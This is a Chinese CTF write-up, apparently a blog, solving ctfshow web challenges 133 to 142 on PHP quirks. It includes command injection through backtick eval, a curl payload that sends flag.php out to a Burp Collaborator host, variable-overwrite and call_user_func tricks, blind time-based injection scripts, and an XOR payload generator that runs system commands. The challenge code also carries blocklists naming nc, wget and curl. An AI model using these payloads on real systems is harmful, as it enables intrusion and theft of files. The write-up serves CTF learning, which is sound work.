<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>($F = @$_GET[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, $F))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr($F,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>这里限制了一些命令执行语句并且还限制了6个数字，我们可以采取套娃的方式来获得更多控制语句的空间</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">get传参：F&#x3D;&#96;$F &#96;;sleep 6</span><br><span class="line"></span><br><span class="line">经过substr($F,0,6)截取后 得到 &#96;$F &#96;; 一共6个字符,之前说过&#96;&#96;反引号等于shell_exec执行命令</span><br><span class="line">eval(&quot;&#96;$F &#96;;sleep 6&quot;); </span><br><span class="line">而$F就是我们输入的&#96;$F &#96;;sleep 6 最后执行的代码应该是&#96;&#96;$F&#96;;+sleep 3&#96;</span><br><span class="line">这样就成功执行了 sleep 6，可以看到发包后延长了6秒左右</span><br><span class="line">前面的命令是执行我们的$F，后面的命令我们就可以自定义$F语句</span><br></pre></td></tr></table></figure>
<p>这里首先打开burpsuite里的Collaborator Client<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web133/%5BJ8M4TZG%7B09R%28%5BFYR_0I6%7D8.png" alt=""><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web133/Z%5B%5BK%29X0Y%29B%28LG%40%28%60T%28P8%5B0Y.png" alt=""><br>
payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?F&#x3D;&#96;$F &#96;;curl -X POST -F aaa&#x3D;@flag.php gn7nld7jteju8f8ww19yhgwfc6ix6m.burpcollaborator.net</span><br></pre></td></tr></table></figure>
<h3 id="web134"><a class="header-anchor" href="#web134">¶</a>web134</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$key1 = <span class="number">0</span>;</span><br><span class="line">$key2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>($_GET[<span class="string">&#x27;key2&#x27;</span>]) || <span class="keyword">isset</span>($_POST[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>($_POST[<span class="string">&#x27;key2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@parse_str($_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">if</span>($key1 == <span class="string">&#x27;36d&#x27;</span> &amp;&amp; $key2 == <span class="string">&#x27;36d&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(file_get_contents(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>看到<code>parse_str()</code>函数和<code>extract()</code>函数，可以看得出是变量覆盖，这两个函数前面的题都讲过了，我们再简单讲一下流程</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">parse_str($_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line">var_dump($_POST);</span><br></pre></td></tr></table></figure>
<p>如果我们传入?_POST[a]=dotast，就会输出<code>array(1) &#123; [&quot;a&quot;]=&gt; string(6) &quot;dotast&quot; &#125;</code>，再使用extract函数，就会变成<code>$a=dotast</code><br>
所以payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?_POST[key1]&#x3D;36d&amp;_POST[key2]&#x3D;36d</span><br></pre></td></tr></table></figure>
<h3 id="web135"><a class="header-anchor" href="#web135">¶</a>web135</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?php</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>($F = @$_GET[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">  <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;</span>, $F))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr($F,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>在web133基础上多ban了很多函数，cp复制到能访问的文本就可以，所以payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?F&#x3D;&#96;$F &#96;;cp flag.php 2.txt</span><br></pre></td></tr></table></figure>
<h3 id="web136"><a class="header-anchor" href="#web136">¶</a>web136</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, $x))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    check($c);</span><br><span class="line">    exec($c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>这里ban了大量函数和字符，不过在linux下还有一个命令tee</p>
<blockquote>
<p>Linux tee命令用于读取标准输入的数据，并将其内容输出成文件<br>
用法:<br>
tee file1 file2   //复制文件<br>
ls|tee 1.txt      <a href="//xn--1-006as2hgg48hc72k.xn--txt-x68dy9al71g">//命令输出到1.txt文件中</a></p>
</blockquote>
<p>首先查看一下根目录文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;ls &#x2F;|tee dotast</span><br></pre></td></tr></table></figure>
<p>接着访问dotast进行下载<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web136/%2892T~FC5~751I%7B%29T%25R%28HKJ6.png" alt=""><br>
读取f149_15_h3r3文件到dotast中，继续下载查看<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web136/%25VRI%2409%2915%25TXNSU%40FKZ~BN.png" alt=""><br>
得到flag</p>
<h3 id="web137"><a class="header-anchor" href="#web137">¶</a>web137</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func($_POST[<span class="string">&#x27;ctfshow&#x27;</span>]); </span><br></pre></td></tr></table></figure>
<p>没有难度，就是直接调用ctfshow类中的getFlag方法就好，payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">post:</span><br><span class="line">ctfshow&#x3D;ctfshow::getFlag</span><br></pre></td></tr></table></figure>
<p>记得右键查看源码</p>
<h3 id="web138"><a class="header-anchor" href="#web138">¶</a>web138</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strripos($_POST[<span class="string">&#x27;ctfshow&#x27;</span>], <span class="string">&quot;:&quot;</span>)&gt;<span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;private function&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">call_user_func($_POST[<span class="string">&#x27;ctfshow&#x27;</span>]); </span><br></pre></td></tr></table></figure>
<p>在前一题基础上把冒号给ban了，但<code>call_user_func</code>支持传入数组形式</p>
<blockquote>
<p>call_user_func(array($ctfshow, ‘getFlag’));<br>
这时候会调用ctfshow中的getFlag方法</p>
</blockquote>
<p>所以payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow[0]&#x3D;ctfshow&amp;ctfshow[1]&#x3D;getFlag</span><br></pre></td></tr></table></figure>
<h3 id="web139"><a class="header-anchor" href="#web139">¶</a>web139</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, $x))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    check($c);</span><br><span class="line">    exec($c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>咋看好似和之前的题没变化，但好像ban了写入文件的权限，没有回显了，只能开始盲注了，这里去了解了一下shell编程😿<br>
利用shell编程的if判断语句配合awk以及cut命令来获取flag<br>
awk逐行获取数据<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web139/U%60%7BH%5DKW%7D_79%60BM%25%40HSKF%259R.png" alt=""><br>
cut命令逐列获取单个字符<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web139/LES%24GLDZX%7D09Y03%7DAVE92_U.png" alt=""><br>
利用if语句来判断命令是否执行<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web139/%24FR_P%5D%5BX%5BYIWN%5DSNEO7GGD7.png" alt=""><br>
用命令<code>ls \</code>查看根目录来获取flag文件名，脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/28 1:25</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://1bb8ea48-6413-47ef-94bb-8dd313c14c9e.chall.ctf.show:8080/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">        <span class="comment">#ascii码表</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">            k=chr(k)</span><br><span class="line">            payload = <span class="string">&quot;?c=&quot;</span> + <span class="string">f&quot;if [ `ls / | awk NR==<span class="subst">&#123;i&#125;</span> | cut -c <span class="subst">&#123;j&#125;</span>` == <span class="subst">&#123;k&#125;</span> ];then sleep 2;fi&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                requests.get(url=url+payload, timeout=(<span class="number">1.5</span>,<span class="number">1.5</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                result = result + k</span><br><span class="line">                print(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    result += <span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web139/%7B7%5D%29%40V~%60CK9%5DLC1ZWF~%40L%28E.png" alt=""><br>
发现一个文件名是f149_15_h3r3的文件，flag就在这里边，那就改一下脚本cat一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/28 1:25</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://1bb8ea48-6413-47ef-94bb-8dd313c14c9e.chall.ctf.show:8080/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="comment">#ascii码表</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        k=chr(k)</span><br><span class="line">        payload = <span class="string">&quot;?c=&quot;</span> + <span class="string">f&quot;if [ `cat /f149_15_h3r3 | cut -c <span class="subst">&#123;j&#125;</span>` == <span class="subst">&#123;k&#125;</span> ];then sleep 2;fi&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(url=url+payload, timeout=(<span class="number">1.5</span>,<span class="number">1.5</span>))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result = result + k</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">result += <span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure>
<p>得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web139/AK861%28EZ0%60FOYCLYCXS%29XYE.png" alt=""><br>
需要加上<code>&#123;&#125;</code></p>
<h3 id="web140"><a class="header-anchor" href="#web140">¶</a>web140</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;f2&#x27;</span>]))&#123;</span><br><span class="line">    $f1 = (<span class="keyword">String</span>)$_POST[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">    $f2 = (<span class="keyword">String</span>)$_POST[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, $f1))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, $f2))&#123;</span><br><span class="line">            $code = <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$f1</span>(<span class="subst">$f2</span>());&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(intval($code) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后if判断弱比较等于“ctfshow”的时候输出flag，看一下弱比较参考表<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web140/QM41DXT%5BCS0X%7DUT%25P%29FY5BS.png" alt=""><br>
可以看到0和字符串进行弱比较的时候返回的是true，因为<code>==</code>在进行比较的时候，会先将字符串类型转化成相同，再比较，而ctfshow是一个字符串，和0相比较的时候要转换成数字，ctfshow转换成数字的时候是0，所以相等返回true<br>
而intval()函数会将非数字或非数字字符串转换为0，也就是我们传入的f1和f2互相构造即可，我们可以构造一个md5，这样intval就会返回0<br>
所以payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">post：</span><br><span class="line">f1&#x3D;md5&amp;f2&#x3D;md5</span><br></pre></td></tr></table></figure>
<p>右键查看源码即可得到flag</p>
<h3 id="web141"><a class="header-anchor" href="#web141">¶</a>web141</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    $v3 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\W+$/&#x27;</span>, $v3))&#123;</span><br><span class="line">            $code =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>分析源代码，这里用了正则表达式<code>/^\W+$/</code>，把数字和字母还有下划线给ban了，之前无字母数字的webshell我们用了或运算，这次用异或来吧（或运算，异或，取反等等都可以），python脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/10 12:56</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成可用的字符</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_rce</span>():</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    preg = <span class="string">&#x27;[a-zA-Z0-9]&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (re.match(preg, chr(i), re.I) <span class="keyword">or</span> re.match(preg, chr(j), re.I)):</span><br><span class="line">                k = i ^ j</span><br><span class="line">                <span class="keyword">if</span> k &gt;= <span class="number">32</span> <span class="keyword">and</span> k &lt;= <span class="number">126</span>:</span><br><span class="line">                    a = <span class="string">&#x27;%&#x27;</span> + hex(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    b = <span class="string">&#x27;%&#x27;</span> + hex(j)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    result += (chr(k) + <span class="string">&#x27; &#x27;</span> + a + <span class="string">&#x27; &#x27;</span> + b + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    f = open(<span class="string">&#x27;xor_rce.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    f.write(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据输入的命令在生成的txt中进行匹配</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = open(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    write_rce()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s1 = input(<span class="string">&quot;\n[+] your function：&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> s1 == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        s2 = input(<span class="string">&quot;[+] your command：&quot;</span>)</span><br><span class="line">        param = action(s1) + action(s2)</span><br><span class="line">        print(<span class="string">&quot;\n[*] result:\n&quot;</span> + param)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web141/GX%7BS4BP5%24%60LJP~5W%7B%25RQDY0.png" alt=""><br>
然后v1和v2就随意填，v3填构造出的payload即可，但注意的是这里有个return干扰，所以我们要在v3的payload前边和后面加上一些字符就可以执行命令，例如<code>\+ - *</code> 等等<br>
查看当前目录下文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;*(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%0c%08&quot;^&quot;%60%7b&quot;);</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web141/%60%60%25%5DZ54%60~O2KZ%282%5BPAEV82W.png" alt=""><br>
看到flag.php，再生成一次payload<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web141/6_%5B%7BLHJB8QLF7J%2555H4GTYC.png" alt=""><br>
获取flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;*(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%08%01%03%00%06%0c%01%07%00%0b%08%0b&quot;^&quot;%7c%60%60%20%60%60%60%60%2e%7b%60%7b&quot;);</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web141/X2%28X%7B%5DSL%5B~ONE~%29%7D%2845B0%28X.png" alt=""></p>
<h3 id="web142"><a class="header-anchor" href="#web142">¶</a>web142</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1))&#123;</span><br><span class="line">        $d = (<span class="keyword">int</span>)($v1 * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span>);</span><br><span class="line">        sleep($d);</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p><code>is_numeric()</code>函数匹配为数字或者数字字符串的话会返回true，所以我们只需要输入数字就可以，但下面有个sleep休眠，所以需要传0，否则等到天荒地老…<br>
payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;0</span><br></pre></td></tr></table></figure>
<h3 id="web143"><a class="header-anchor" href="#web143">¶</a>web143</h3>
